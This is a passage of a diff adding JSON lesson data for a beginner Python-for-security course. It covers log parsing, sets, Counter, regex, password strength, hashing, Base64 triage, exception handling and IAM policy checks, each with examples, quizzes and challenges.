+    "p": "SSH isn't running on Kali by default. Start it, fail a login and export the log. Then count the failures with Python.",
+    "code": "sudo systemctl start ssh\nssh nobody@localhost    # type yes, a wrong password, then Ctrl+C\nsudo journalctl -u ssh > ssh.log\npython3 -c '\ncount = 0\nwith open(\"ssh.log\", errors=\"replace\") as f:\n    for line in f:\n        if \"Failed password\" in line:\n            count += 1\nprint(count, \"failed logins\")\n'\nsudo systemctl stop ssh"
+   },
+   "quiz": [
+    {
+     "d": 1,
+     "q": "What does `with open(...) as f:` give you that plain `open()` doesn't?",
+     "o": [
+      "It opens the file more quickly",
+      "It encrypts the file's contents",
+      "It closes the file automatically"
+     ],
+     "k": 2,
+     "w": "It closes the file automatically. The with block guarantees the file is closed when the block ends, even if an error interrupts it. Not speed: with doesn't change how fast a file opens. Not encryption: with doesn't change the contents."
+    },
+    {
+     "d": 2,
+     "q": "Why loop over a log file line by line instead of reading it all at once?",
+     "o": [
+      "It sorts the lines by time",
+      "It removes duplicate lines",
+      "It works on huge files"
+     ],
+     "k": 2,
+     "w": "It works on huge files, even ones bigger than memory. Only one line is held at a time, so file size stops mattering. Not sorting or removing duplicates: the loop reads every line in its original order."
+    },
+    {
+     "d": 1,
+     "run": true,
+     "q": "What does this print?",
+     "code": "log = \"Failed a\\nAccepted b\\nFailed c\"\ncount = 0\nfor line in log.splitlines():\n    if \"Failed\" in line:\n        count += 1\nprint(count)",
+     "o": [
+      "1",
+      "2",
+      "3"
+     ],
+     "k": 1,
+     "w": "2. Two lines contain \"Failed\", so the count goes up twice. Not 3: the Accepted line doesn't match. Not 1: the loop checks every line."
+    }
+   ],
+   "challenge": {
+    "p": "Print the source IP of every failed login, one per line, repeats included. The IP is the word after `from`.",
+    "start": "LOG = \"\"\"Nov 17 09:14:01 kali sshd[812]: Failed password for root from 203.0.113.7 port 50122 ssh2\nNov 17 09:14:05 kali sshd[812]: Failed password for root from 203.0.113.7 port 50124 ssh2\nNov 17 09:15:12 kali sshd[815]: Accepted publickey for kane from 10.10.10.10 port 51000 ssh2\nNov 17 09:16:40 kali sshd[818]: Failed password for invalid user admin from 198.51.100.23 port 40001 ssh2\nNov 17 09:16:44 kali sshd[818]: Failed password for root from 203.0.113.7 port 50130 ssh2\"\"\"\nfor line in LOG.splitlines():\n    if \"Failed password\" in line:\n        parts = line.split()\n",
+    "hint": "`parts.index(\"from\")` gives the position of `from`, so the IP is at that position plus 1.",
+    "solution": "LOG = \"\"\"Nov 17 09:14:01 kali sshd[812]: Failed password for root from 203.0.113.7 port 50122 ssh2\nNov 17 09:14:05 kali sshd[812]: Failed password for root from 203.0.113.7 port 50124 ssh2\nNov 17 09:15:12 kali sshd[815]: Accepted publickey for kane from 10.10.10.10 port 51000 ssh2\nNov 17 09:16:40 kali sshd[818]: Failed password for invalid user admin from 198.51.100.23 port 40001 ssh2\nNov 17 09:16:44 kali sshd[818]: Failed password for root from 203.0.113.7 port 50130 ssh2\"\"\"\nfor line in LOG.splitlines():\n    if \"Failed password\" in line:\n        parts = line.split()\n        print(parts[parts.index(\"from\") + 1])",
+    "expect": "203.0.113.7\n203.0.113.7\n198.51.100.23\n203.0.113.7"
+   },
+   "recap": [
+    "Always open files with `with`.",
+    "Loop line by line; never load a huge log at once.",
+    "`.strip()` removes the newline at the end of each line.",
+    "Find the field by a nearby word, not a fixed position.",
+    "`errors=\"replace\"` survives messy logs."
+   ]
+  },
+  {
+   "t": "Sets for unique IPs",
+   "sub": "Remove duplicates and compare groups.",
+   "learn": [
+    [
+     "Key terms",
+     "Set: a collection of unique values with no fixed order.\nAsset inventory: a list of every system and device an organisation owns.\nShadow IT: devices or software that people use without the organisation's approval."
+    ],
+    [
+     "What a set is",
+     "A set holds unique values with no fixed order. `set(ips)` throws away duplicates, so `len(set(ips))` counts the distinct IPs.",
+     "ips = [\"1.1.1.1\", \"2.2.2.2\", \"1.1.1.1\"]\nprint(len(set(ips)))"
+    ],
+    [
+     "Comparing sets",
+     "`a - b` is what's in a but not b. `a & b` is what's in both. That's how you compare what a scanner found with your asset inventory."
+    ],
+    [
+     "Sorting for output",
+     "A set's printed order can change from run to run. Use `sorted(myset)` when you want stable, readable output."
+    ]
+   ],
+   "play": {
+    "p": "Change the lists and see which hosts are unknown.",
+    "code": "assets = {\"10.0.0.1\", \"10.0.0.2\", \"10.0.0.3\"}\nseen = {\"10.0.0.2\", \"10.0.0.3\", \"10.0.0.9\"}\nprint(\"unknown:\", sorted(seen - assets))\nprint(\"both:\", sorted(seen & assets))"
+   },
+   "real": [
+    "On the job",
+    "Comparing the hosts on the network with the hosts in the asset inventory is how shadow IT is found. Shadow IT means devices or software used without approval. With sets, it's one line: `seen - assets`."
+   ],
+   "myth": [
+    "A set keeps items in the order you added them.",
+    "A set doesn't promise any order. If the order you added items matters, use a list instead."
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "What does this print?",
+     "run": true,
+     "code": "ips = [\"1.1.1.1\", \"2.2.2.2\", \"1.1.1.1\"]\nprint(len(set(ips)))",
+     "o": [
+      "1",
+      "2",
+      "3"
+     ],
+     "k": 1,
+     "w": "2. The set keeps one copy of each address, so there are two. Not 3: that counts the duplicate as well. Not 1: 1.1.1.1 and 2.2.2.2 are different addresses."
+    },
+    {
+     "d": 2,
+     "q": "What does this print?",
+     "run": true,
+     "code": "a = {1, 2, 3}\nb = {1, 2, 4}\nprint(a - b)",
+     "o": [
+      "{3}",
+      "{1, 2}",
+      "{1, 2, 3, 4}"
+     ],
+     "k": 0,
+     "w": "{3}. `a - b` keeps what's only in a, and 3 is the only value b doesn't have. Not {1, 2}: that's the overlap, which & gives. Not {1, 2, 3, 4}: that's everything in either set."
+    },
+    {
+     "d": 1,
+     "q": "Why print `sorted(myset)` instead of the set itself?",
+     "o": [
+      "Sets can't be printed",
+      "Sets have no fixed order",
+      "sorted removes duplicates"
+     ],
+     "k": 1,
+     "w": "Sets have no fixed order. Sorting gives stable, readable output each time. Not that sets can't be printed: they can, in any order. Not duplicates: the set has already removed them."
+    }
+   ],
+   "challenge": {
+    "p": "Print the unique failed-login IPs, sorted, as a list.",
+    "start": "fails = [\"203.0.113.7\", \"198.51.100.23\", \"203.0.113.7\", \"192.0.2.4\"]\n",
+    "hint": "`sorted(set(fails))` removes duplicates and sorts in one go.",
+    "solution": "fails = [\"203.0.113.7\", \"198.51.100.23\", \"203.0.113.7\", \"192.0.2.4\"]\nprint(sorted(set(fails)))",
+    "expect": "['192.0.2.4', '198.51.100.23', '203.0.113.7']"
+   },
+   "recap": [
+    "Sets keep one copy of each value.",
+    "`a - b` finds what's missing; `a & b` finds the overlap.",
+    "Sets have no order, so sort before printing.",
+    "Sets are great for comparing asset lists."
+   ]
+  },
+  {
+   "t": "collections.Counter",
+   "sub": "Count things in one line.",
+   "learn": [
+    [
+     "Key terms",
+     "Module: a file of ready-made Python code that you load with import.\nCounter: a tool in the collections module that counts how often each item appears.\nTop talkers: the hosts that send or receive the most traffic."
+    ],
+    [
+     "Counter does it for you",
+     "`collections.Counter` counts every item in a list in one line. It's perfect for top talkers and top failed-login sources.",
+     "from collections import Counter\nfails = [\"1.1.1.1\", \"2.2.2.2\", \"1.1.1.1\"]\nprint(Counter(fails).most_common(1))"
+    ],
+    [
+     "most_common",
+     "`.most_common(n)` gives the top n. For example, `Counter(ips).most_common(3)` gives the top three as (value, count) pairs, already sorted. Use it for a \"top attackers\" report."
+    ],
+    [
+     "Counters add up",
+     "You can update a Counter as you go with `c[ip] += 1`. A missing key starts at 0, so there's no KeyError."
+    ]
+   ],
+   "play": {
+    "p": "Change the list and the number passed to `most_common`.",
+    "code": "from collections import Counter\nips = [\"203.0.113.7\", \"198.51.100.23\", \"203.0.113.7\", \"203.0.113.7\", \"192.0.2.4\"]\nfor ip, n in Counter(ips).most_common(2):\n    print(ip, n)"
+   },
+   "real": [
+    "On the job",
+    "\"Which IPs failed to log in the most last night?\" is a daily question in a security operations centre (SOC). Read the log, pull out the IPs and put them in a Counter. Then print `most_common(10)`."
+   ],
+   "tryit": {
+    "h": "Count top talkers",
+    "where": "Kali: python3",
+    "p": "Count how often each IP appears and print the top two.",
+    "code": "from collections import Counter\nips = [\"10.10.10.20\", \"10.10.10.30\", \"10.10.10.20\", \"8.8.8.8\", \"10.10.10.20\"]\nfor ip, n in Counter(ips).most_common(2):\n    print(ip, n)"
+   },
+   "myth": [
+    "You need a database to count events.",
+    "For millions of lines, maybe. For a day's authentication log, a Counter in memory is instant."
+   ],
+   "quiz": [
+    {
+     "d": 2,
+     "run": true,
+     "q": "What does this print?",
+     "code": "from collections import Counter\nprint(Counter([\"a\", \"b\", \"a\"]).most_common(1))",
+     "o": [
+      "a",
+      "{'a': 2}",
+      "[('a', 2)]"
+     ],
+     "k": 2,
+     "w": "[('a', 2)]. `most_common` returns a list of (item, count) pairs, highest first. Not {'a': 2}: that's a dictionary, not a list. Not just a: the result includes the count as well as the item."
+    },
+    {
+     "d": 1,
+     "q": "What does this print?",
+     "run": true,
+     "code": "from collections import Counter\nc = Counter()\nc[\"root\"] += 1\nprint(c[\"root\"])",
+     "o": [
+      "0",
+      "1",
+      "A KeyError"
+     ],
+     "k": 1,
+     "w": "1. Missing keys start at 0 in a Counter, so adding 1 gives 1. Not 0: the line that adds 1 did run. Not a KeyError: a Counter treats a missing key as 0."
+    },
+    {
+     "d": 2,
+     "q": "What does this print?",
+     "run": true,
+     "code": "from collections import Counter\nprint(Counter(\"abaab\").most_common(1)[0])",
+     "o": [
+      "3",
+      "('a', 3)",
+      "('b', 2)"
+     ],
+     "k": 1,
+     "w": "('a', 3). `most_common(1)` returns a list holding the top pair; `[0]` takes that pair out. Not ('b', 2): b appears less often than a. Not 3: you get the whole pair, not just the count."
+    }
+   ],
+   "challenge": {
+    "p": "Print the single most-targeted username and its count, like `root 3`.",
+    "start": "from collections import Counter\nusers = [\"root\", \"admin\", \"root\", \"test\", \"root\", \"admin\"]\n",
+    "hint": "`Counter(users).most_common(1)[0]` gives a (name, count) pair.",
+    "solution": "from collections import Counter\nusers = [\"root\", \"admin\", \"root\", \"test\", \"root\", \"admin\"]\nname, n = Counter(users).most_common(1)[0]\nprint(name, n)",
+    "expect": "root 3"
+   },
+   "recap": [
+    "Counter counts a list in one line.",
+    "`most_common(n)` gives the top n.",
+    "Missing keys start at 0.",
+    "Use it for top-attacker reports."
+   ]
+  },
+  {
+   "t": "Regex for IP addresses",
+   "sub": "Find patterns, not just fixed text.",
+   "learn": [
+    [
+     "Key terms",
+     "Regular expression (regex): a pattern that matches text.\nRaw string: a string with r before the quotes, which keeps backslashes exactly as typed.\nCapture group: brackets in a pattern that save part of the match.\nEscape: putting a backslash before a character so it's matched literally."
+    ],
+    [
+     "What regex is",
+     "A regular expression (regex) is a pattern that matches text. Python's `re` module uses it to find IP addresses, usernames or error codes inside messy lines."
+    ],
+    [
+     "Raw strings",
+     "Write patterns as raw strings, like `r\"...\"`. The r stops Python treating backslashes as its own escapes."
+    ],
+    [
+     "Building blocks",
+     "`\\d` matches a digit, and `\\S` matches any non-whitespace character. `+` means one or more. `.` matches any character except a newline, so escape it as `\\.` when you mean a real dot."
+    ],
+    [
+     "Capture groups",
+     "Brackets in a pattern capture part of the match. `re.search` returns a match object, which holds the result. `.group(1)` gives you what the first brackets captured.",
+     "import re\nline = \"Failed password for root from 10.0.0.5 port 22\"\nm = re.search(r\"from (\\S+)\", line)\nif m:\n    print(m.group(1))"
+    ],
+    [
+     "findall",
+     "`re.findall` returns every match in the text as a list. It's the quickest way to pull all the IP addresses or numbers out of a line."
+    ],
+    [
+     "Check what you match",
+     "A simple IP pattern also matches impossible values like 999.999.999.999. Check your results with the `ipaddress` module."
+    ]
+   ],
+   "play": {
+    "p": "Add more addresses to the text and run it again.",
+    "code": "import re\ntext = \"Blocked 10.10.10.10 and 203.0.113.7; allowed 10.10.10.20\"\nprint(re.findall(r\"\\d+\\.\\d+\\.\\d+\\.\\d+\", text))"
+   },
+   "real": [
+    "On the job",
+    "Threat intelligence reports list indicators, such as IPs and domains, inside paragraphs of text. A regex pulls them out in seconds. Then you can block them, or search for them in your security information and event management (SIEM) system."
+   ],
+   "myth": [
+    "You need to memorise regex syntax.",
+    "Most people don't. Learn the few building blocks here, then test patterns on a site like regex101 or in the Python prompt."
+   ],
+   "quiz": [
+    {
+     "d": 2,
+     "run": true,
+     "q": "What does this print?",
+     "code": "import re\nm = re.search(r\"from (\\S+)\", \"Failed password for root from 10.0.0.5 port 22\")\nprint(m.group(1))",
+     "o": [
+      "root",
+      "10.0.0.5",
+      "from 10.0.0.5"
+     ],
+     "k": 1,
+     "w": "10.0.0.5. The brackets capture the non-space text right after \"from \". Not root: the pattern looks after from, not before it. Not from 10.0.0.5: group 1 holds only what the brackets captured."
+    },
+    {
+     "d": 2,
+     "run": true,
+     "q": "What does this print?",
+     "code": "import re\nprint(re.findall(r\"\\d+\", \"port 22 and 443\"))",
+     "o": [
+      "22443",
+      "[22, 443]",
+      "['22', '443']"
+     ],
+     "k": 2,
+     "w": "['22', '443']. findall returns every match as a string inside a list. Not [22, 443]: regex matches are text, not numbers. Not 22443: the matches stay as separate items in the list."
+    },
+    {
+     "d": 3,
+     "q": "Why write the pattern as `r\"\\d+\"` instead of `\"\\d+\"`?",
+     "o": [
+      "It makes the pattern run faster",
+      "It makes the regex case-insensitive",
+      "The r keeps backslashes exactly as typed"
+     ],
+     "k": 2,
+     "w": "The r keeps backslashes exactly as typed. A raw string stops Python treating backslashes as its own escapes. Without it, `\\b` (a regex word boundary) silently becomes a backspace character. Not case or speed: the r changes neither."
+    }
+   ],
+   "challenge": {
+    "p": "Use a capture group to print the IP after `from` in this line.",
+    "start": "import re\nline = \"Failed password for root from 203.0.113.7 port 50122 ssh2\"\n",
+    "hint": "`re.search(r\"from (\\S+)\", line)` then `.group(1)`.",
+    "solution": "import re\nline = \"Failed password for root from 203.0.113.7 port 50122 ssh2\"\nm = re.search(r\"from (\\S+)\", line)\nprint(m.group(1))",
+    "expect": "203.0.113.7"
+   },
+   "recap": [
+    "`re.search` finds the first match; `re.findall` finds them all.",
+    "Capture groups pull out just the part you need.",
+    "Use raw strings for patterns.",
+    "Escape a real dot as `\\.`.",
+    "Check IP matches with the `ipaddress` module."
+   ]
+  },
+  {
+   "t": "Password strength checker",
+   "sub": "Combine checks into one useful tool.",
+   "learn": [
+    [
+     "Key terms",
+     "Passphrase: a long password made of several words.\nBreached-password list: a list of passwords already exposed in data breaches.\nany(): a built-in function that returns True if at least one item is True."
+    ],
+    [
+     "Length matters most",
+     "Length matters most in a password. The National Institute of Standards and Technology (NIST) covers this in SP 800-63B-4 (2025). It requires at least 15 characters when a password is the only factor."
+    ],
+    [
+     "No forced symbols or changes",
+     "NIST SP 800-63B-4 bans forced symbol rules. It also bans routine password changes."
+    ],
+    [
+     "Checks with any()",
+     "`any(c.isdigit() for c in pw)` is True if at least one character is a digit. Read it as: for each character c, is it a digit? The same pattern works with `.isupper()` and `.islower()`."
+    ],
+    [
+     "Keep it honest",
+     "A checker can only guess. A long password that's already in a breach list is still weak. That's why NIST requires checks against breached-password lists."
+    ]
+   ],
+   "play": {
+    "p": "Try different passwords and watch the score change.",
+    "code": "pw = \"Summer2024\"\nscore = 0\nif len(pw) >= 12: score += 1\nif any(c.isdigit() for c in pw): score += 1\nif any(c.isupper() for c in pw): score += 1\nif pw.lower() not in [\"password\", \"summer2024\", \"letmein\"]: score += 1\nprint(pw, \"scores\", score, \"out of 4\")"
+   },
+   "real": [
+    "On the job",
+    "Help desk staff often get asked \"is this a good password?\" Interviewers ask about it too. The key point is that length and breach checks matter more than symbols."
+   ],
+   "myth": [
+    "Adding a symbol makes any password strong.",
+    "\"P@ssw0rd!\" has symbols and is in every breach list. Length and uniqueness matter more."
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "What does this print?",
+     "run": true,
+     "code": "pw = \"hunter9\"\nprint(any(c.isdigit() for c in pw))",
+     "o": [
+      "9",
+      "True",
+      "False"
+     ],
+     "k": 1,
+     "w": "True. \"9\" is a digit, so `any()` finds at least one. Not False: one digit is enough. Not 9: `any()` returns True or False, not the matching character."
+    },
+    {
+     "d": 2,
+     "q": "Which is the strongest choice?",
+     "o": [
+      "A long, unique passphrase",
+      "An 8-character password with a symbol",
+      "Your old password with the year changed"
+     ],
+     "k": 0,
+     "w": "A long, unique passphrase. Length and uniqueness beat complexity rules. Not the 8-character password: it's short, and a symbol adds little. Not the old password with a new year: attackers guess that change easily."
+    },
+    {
+     "d": 1,
+     "q": "What does this print?",
+     "run": true,
+     "code": "print(any(c.isupper() for c in \"abc\"))",
+     "o": [
+      "True",
+      "False",
+      "An error"
+     ],
+     "k": 1,
+     "w": "False. \"abc\" has no upper-case letters, so no character passes the check. Not True: that needs at least one upper-case letter. Not an error: `any()` works on any string."
+    }
+   ],
+   "challenge": {
+    "p": "Write `strong(pw)` that returns True only if the password is at least 15 characters long. That's NIST's minimum when a password is the only factor. Print `strong(\"correct horse battery\")`.",
+    "start": "def strong(pw):\n    pass\n\nprint(strong(\"correct horse battery\"))",
+    "hint": "`return len(pw) >= 15`",
+    "solution": "def strong(pw):\n    return len(pw) >= 15\n\nprint(strong(\"correct horse battery\"))",
+    "expect": "True"
+   },
+   "recap": [
+    "Length matters most.",
+    "NIST bans forced symbol rules and routine changes.",
+    "`any(... for c in pw)` checks for a type of character.",
+    "A checker estimates; it can't prove strength.",
+    "Check against breached-password lists."
+   ]
+  },
+  {
+   "t": "hashlib and SHA-256",
+   "sub": "Fingerprint text and files.",
+   "learn": [
+    [
+     "Key terms",
+     "Hash: a short fingerprint of data that changes if the data changes.\nBytes: raw data stored as numbers from 0 to 255.\nHex digest: a hash written as hexadecimal text, using 0 to 9 and a to f.\nSalt: a random value added to each password before hashing, so identical passwords get different hashes."
+    ],
+    [
+     "hashlib",
+     "Python's `hashlib` module computes hashes such as SHA-256, a Secure Hash Algorithm (SHA) with a 256-bit result. Hash functions work on bytes, so turn text into bytes first with `.encode()`. Then `.hexdigest()` gives the familiar hex string.",
+     "import hashlib\nprint(hashlib.sha256(\"hello\".encode()).hexdigest())"
+    ],
+    [
+     "Hashing a file",
+     "Open the file in binary mode and feed it to the hash in chunks. Chunks stop large files filling memory. Compare the result with the publisher's hash to check integrity. A tiny change to the file gives a completely different hash."
+    ],
+    [
+     "Passwords need more",
+     "SHA-256 is too fast for storing passwords. Use a slow, salted algorithm such as Argon2 or bcrypt instead. Use Argon2 via a library like argon2-cffi, and never write your own."
+    ]
+   ],
+   "play": {
+    "p": "Change one letter of the text and see how much the hash changes.",
+    "code": "import hashlib\nprint(hashlib.sha256(\"hello\".encode()).hexdigest())\nprint(hashlib.sha256(\"hellp\".encode()).hexdigest())"
+   },
+   "real": [
+    "On the job",
+    "Malware analysts share file hashes, not files. Search for a file's SHA-256 in a threat intelligence service. In seconds, you'll see whether a suspicious attachment is already known to be malicious."
+   ],
+   "tryit": {
+    "h": "Hash a file in chunks",
+    "where": "Kali: save as hashfile.py",
+    "p": "Hash any file, then run `sha256sum` on the same file. The two results should match exactly.",
+    "code": "import hashlib, sys\nh = hashlib.sha256()\nwith open(sys.argv[1], \"rb\") as f:\n    for chunk in iter(lambda: f.read(65536), b\"\"):\n        h.update(chunk)\nprint(h.hexdigest())\n# run: python3 hashfile.py /etc/hostname\n# compare: sha256sum /etc/hostname"
+   },
+   "myth": [
+    "A hash can be reversed to get the original back.",
+    "A hash is one-way. Attackers \"crack\" hashes by guessing inputs and hashing each guess. That's why slow password hashes matter."
+   ],
+   "quiz": [
+    {
+     "d": 2,
+     "run": true,
+     "q": "What does this print?",
+     "code": "import hashlib\nprint(len(hashlib.sha256(b\"x\").hexdigest()))",
+     "o": [
+      "32",
+      "64",
+      "256"
+     ],
+     "k": 1,
+     "w": "64. SHA-256 gives 256 bits, which is 32 bytes, and each byte is 2 hex characters. Not 32: that's the length in bytes. Not 256: that's the length in bits."
+    },
+    {
+     "d": 1,
+     "q": "Which should you use to store user passwords?",
+     "o": [
+      "Base64",
+      "Argon2 or bcrypt",
+      "SHA-256 on its own"
+     ],
+     "k": 1,
+     "w": "Argon2 or bcrypt. They're slow and salted, so stolen hashes are expensive to crack. Not SHA-256 on its own: it's too fast. Not Base64: it's encoding, so anyone can reverse it."
+    },
+    {
+     "d": 1,
+     "q": "Why call `.encode()` before hashing text?",
+     "o": [
+      "It makes the hash shorter",
+      "It encrypts the text first",
+      "hashlib needs bytes, not text"
+     ],
+     "k": 2,
+     "w": "hashlib needs bytes, not text. `.encode()` turns text into bytes using UTF-8. Not encryption: anyone can turn the bytes back into text. Not shorter: a SHA-256 hash has the same length for any input."
+    }
+   ],
+   "challenge": {
+    "p": "Print the first 8 characters of the SHA-256 hash of `abc`.",
+    "start": "import hashlib\n",
+    "hint": "Get the hex digest, then slice it with `[:8]`.",
+    "solution": "import hashlib\nprint(hashlib.sha256(\"abc\".encode()).hexdigest()[:8])",
+    "expect": "ba7816bf"
+   },
+   "recap": [
+    "Hashes work on bytes: `.encode()` text first.",
+    "A tiny change gives a completely different hash.",
+    "Hash big files in chunks, in binary mode.",
+    "Passwords need Argon2 or bcrypt."
+   ]
+  },
+  {
+   "t": "Base64",
+   "sub": "Encoding you'll see in logs and phishing, and why it isn't security.",
+   "learn": [
+    [
+     "Key terms",
+     "Encoding: changing data into another format that anyone can reverse, with no key.\nBase64: an encoding that turns bytes into plain text characters.\nTriage: a quick first check of an alert to decide how serious it is."
+    ],
+    [
+     "Encoding isn't encryption",
+     "Base64 turns bytes into plain text that's safe to send in email or JavaScript Object Notation (JSON). Anyone can reverse it with no key. So Base64 in a script or config file means the data is obscured, not protected."
+    ],
+    [
+     "Encode and decode",
+     "`base64.b64encode()` needs bytes, so call `.encode()` on text first. `b64decode()` accepts a Base64 string or bytes. Both return bytes, so call `.decode()` on the result to get text back.",
+     "import base64\nenc = base64.b64encode(\"whoami\".encode())\nprint(enc)\nprint(base64.b64decode(enc).decode())"
+    ],
+    [
+     "Where you'll see it",
+     "Attackers use Base64 to hide commands, for example with `powershell -EncodedCommand`. Decoding is often the first step in triaging a suspicious command line."
+    ],
+    [
+     "Decoding PowerShell",
+     "PowerShell turns commands into UTF-16LE bytes, a Windows text format, then Base64. So decode it with `base64.b64decode(s).decode(\"utf-16-le\")` to see the real command."
+    ]
+   ],
+   "play": {
+    "p": "Decode the string, then encode a message of your own.",
+    "code": "import base64\nprint(base64.b64decode(\"aGVsbG8=\").decode())\nprint(base64.b64encode(\"lab only\".encode()).decode())"
+   },
+   "real": [
+    "On the job",
+    "An endpoint detection and response (EDR) alert shows `powershell -enc` followed by a long string. Decode it with `.decode(\"utf-16-le\")` to see the real command in seconds."
+   ],
+   "myth": [
+    "Base64 hides secrets.",
+    "One line of Python reverses Base64. Attackers use it to slip past simple text filters, not to protect anything."
+   ],
+   "quiz": [
+    {
+     "d": 2,
+     "run": true,
+     "q": "What does this print?",
+     "code": "import base64\nprint(base64.b64decode(\"aGk=\").decode())",
+     "o": [
+      "hi",
+      "aGk=",
+      "An error, because you need a key"
+     ],
+     "k": 0,
+     "w": "hi. `b64decode` reverses the encoding, and `.decode()` turns the bytes into text. Not aGk=: that's the encoded input. Not an error: Base64 needs no key, which is why it's encoding, not encryption."
+    },
+    {
+     "d": 1,
+     "q": "Can Base64 protect a stored password?",
+     "o": [
+      "Yes, it's encryption",
+      "Only with a long key",
+      "No, anyone can decode it"
+     ],
+     "k": 2,
+     "w": "No, anyone can decode it. Base64 is encoding, not encryption. Not encryption: nothing secret is needed to reverse it. Not with a long key: Base64 doesn't use a key at all."
+    },
+    {
+     "d": 2,
+     "q": "What does this print?",
+     "run": true,
+     "code": "import base64\nprint(base64.b64encode(b\"hi\").decode())",
+     "o": [
+      "hi",
+      "aGk=",
+      "b'hi'"
+     ],
+     "k": 1,
+     "w": "aGk=. \"hi\" encodes to aGk= in Base64, and `.decode()` turns the result into text. Not hi: that's the input before encoding. Not b'hi': the output is encoded, and `.decode()` gives text, not bytes."
+    }
+   ],
+   "challenge": {
+    "p": "Decode this string and print the hidden command.",
+    "start": "import base64\nsecret = \"bmV0IHVzZXI=\"\n",
+    "hint": "`base64.b64decode(secret).decode()`",
+    "solution": "import base64\nsecret = \"bmV0IHVzZXI=\"\nprint(base64.b64decode(secret).decode())",
+    "expect": "net user"
+   },
+   "recap": [
+    "Base64 is reversible encoding, not encryption.",
+    "It works on bytes: encode and decode around it.",
+    "Attackers use it to hide commands.",
+    "Decoding is a normal triage step.",
+    "Decode PowerShell commands as UTF-16LE."
+   ]
+  },
+  {
+   "t": "try and except",
+   "sub": "Scripts that survive bad input.",
+   "learn": [
+    [
+     "Key terms",
+     "Exception: an error that Python raises while a script runs, such as ValueError.\nTraceback: the error report Python prints when an exception stops a script.\nFailing open: allowing access when a security check breaks."
+    ],
+    [
+     "Exceptions",
+     "When something goes wrong, Python raises an exception, such as FileNotFoundError or ValueError. If nothing handles it, the exception stops the script and prints a traceback."
+    ],
+    [
+     "try and except",
+     "Put risky code in a try block. Handle a specific exception in the except block, so the script keeps running.",
+     "try:\n    port = int(\"ssh\")\nexcept ValueError:\n    print(\"not a port number\")"
+    ],
+    [
+     "Catch specific errors",
+     "Catch only the errors you expect, such as ValueError. A bare `except:` catches everything, so it hides real bugs."
+    ],
+    [
+     "Fail closed",
+     "If a security check can't finish, decide what happens. A check that returns True (\"allowed\") when it hits an error is failing open. The Open Worldwide Application Security Project (OWASP) lists this as A10:2025 Mishandling of Exceptional Conditions. Default to deny."
+    ]
+   ],
+   "play": {
+    "p": "Change the list so every value is a number, then add more bad values.",
+    "code": "for value in [\"22\", \"ssh\", \"443\"]:\n    try:\n        print(int(value) + 1)\n    except ValueError:\n        print(\"skipped\", value)"
+   },
+   "real": [
+    "On the job",
+    "A scheduled script crashes at 3am on one malformed log line. Nobody notices for a week. Handle the expected error, log it and carry on, so monitoring keeps running."
+   ],
+   "myth": [
+    "Catching every exception with a bare except is the safe choice.",
+    "A bare except can even catch Ctrl+C, so you might not be able to stop a stuck script. Let real problems surface where you can see them."
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "run": true,
+     "q": "What does this print?",
+     "code": "try:\n    port = int(\"8080\")\n    print(\"port\", port)\nexcept ValueError:\n    print(\"bad input\")",
+     "o": [
+      "bad input",
+      "port 8080",
+      "A traceback"
+     ],
+     "k": 1,
+     "w": "port 8080. \"8080\" is all digits, so `int()` works and the except block is skipped. Not bad input: that only prints after a ValueError. Not a traceback: no exception is raised."
+    },
+    {
+     "d": 3,
+     "q": "An access check hits a database error and returns True. What's wrong?",
+     "o": [
+      "It's too slow",
+      "It fails open",
+      "It logs too much"
+     ],
+     "k": 1,
+     "w": "It fails open: an error grants access, so an outage becomes a breach. When a check can't finish, deny by default. Not speed or logging: the problem is what the check returns on error."
+    },
+    {
+     "d": 1,
+     "run": true,
+     "q": "What does this print?",
+     "code": "try:\n    print(int(\"7\") * 2)\nexcept ValueError:\n    print(\"bad\")",
+     "o": [
+      "14",
+      "77",
+      "bad"
+     ],
+     "k": 0,
+     "w": "14. \"7\" converts cleanly, so no exception happens and the except block is skipped. Not 77: `int()` made it a number, so `*` multiplies. Not bad: that only prints after a ValueError."
+    }
+   ],
+   "challenge": {
+    "p": "Add up only the valid port numbers and print the total. Skip anything that isn't a number.",
+    "start": "values = [\"22\", \"eighty\", \"443\", \"\"]\ntotal = 0\n",
+    "hint": "Loop over values, and wrap `total += int(v)` in try/except ValueError.",
+    "solution": "values = [\"22\", \"eighty\", \"443\", \"\"]\ntotal = 0\nfor v in values:\n    try:\n        total += int(v)\n    except ValueError:\n        pass\nprint(total)",
+    "expect": "465"
+   },
+   "recap": [
+    "Exceptions stop scripts unless handled.",
+    "Catch specific errors, not everything.",
+    "A bare `except:` hides real bugs.",
+    "Security checks should fail closed: deny on error.",
+    "Skip bad lines and keep going."
+   ]
+  },
+  {
+   "t": "JSON: spot \"*\" in an IAM policy",
+   "sub": "Read security data the way APIs send it.",
+   "learn": [
+    [
+     "Key terms",
+     "JavaScript Object Notation (JSON): a text format for structured, nested data.\nIdentity and Access Management (IAM) policy: a JSON document that says what an identity may do on which resources.\nWildcard: the * symbol, which matches everything."
+    ],
+    [
+     "JSON",
+     "Most security application programming interfaces (APIs) and cloud logs use JavaScript Object Notation (JSON). So do most security information and event management (SIEM) exports. `json.loads()` turns JSON text into Python dictionaries and lists. `json.dumps()` turns them back into text."
+    ],
+    [
+     "Reading nested data",
+     "Parsed JSON is dictionaries and lists inside each other. Reach into it one step at a time, with keys and indexes.",
+     "import json\nalert = json.loads('{\"rule\": \"brute force\", \"src\": {\"ip\": \"203.0.113.7\"}, \"count\": 42}')\nprint(alert[\"src\"][\"ip\"], alert[\"count\"])"
+    ],
+    [
+     "IAM policies are JSON",
+     "An Amazon Web Services (AWS) Identity and Access Management (IAM) policy is JSON. It holds a list of `Statement` entries."
+    ],
+    [
+     "Allowing * on *",
+     "`\"Effect\": \"Allow\"` with `\"Action\": \"*\"` on `\"Resource\": \"*\"` allows everything on everything. That breaks least privilege: giving each person and process only the access their job needs. With `\"Deny\"`, the same statement would block everything instead."
+    ],
+    [
+     "Pretty printing",
+     "`json.dumps(data, indent=2)` formats JSON with line breaks and indents. That makes a messy API response readable in seconds."
+    ]
+   ],
+   "play": {
+    "p": "The policy is a JSON string. Run it, then change the second statement's Action to `s3:ListBucket`.",
